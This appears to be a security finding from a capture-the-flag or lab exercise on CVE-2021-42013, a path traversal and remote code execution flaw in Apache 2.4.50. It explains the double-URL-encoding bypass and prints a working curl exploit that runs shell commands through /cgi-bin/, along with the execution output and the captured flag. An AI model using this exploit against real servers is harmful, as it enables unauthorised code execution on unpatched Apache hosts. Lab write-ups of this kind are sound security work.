findings.title: CVE-2021-42013: Apache 2.4.50 Path Traversal + RCE via mod_cgi — CTF Flag Extracted
findings.description: Apache 2.4.50 is vulnerable to CVE-2021-42013, an incomplete fix for CVE-2021-41773. The path traversal bypass uses double URL encoding: `%%32%65` decodes first to `%2e` then to `.`, allowing directory traversal past the cgi-bin alias. When mod_cgi is enabled, this leads to remote code execution as daemon (uid=2). The server exposes /bin/sh through 5 levels of traversal from /cgi-bin/.
findings.evidence:
Exploit command:
curl --path-as-is -X POST 'http://172.17.0.1:58759/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo; cat /FLAG.txt'

RCE output (id): uid=2(daemon) gid=2(daemon) groups=1(bin),2(daemon),2(daemon),4(adm)

Flag: flag{34bf3705-7f13-4540-b94f-273371c323f1}
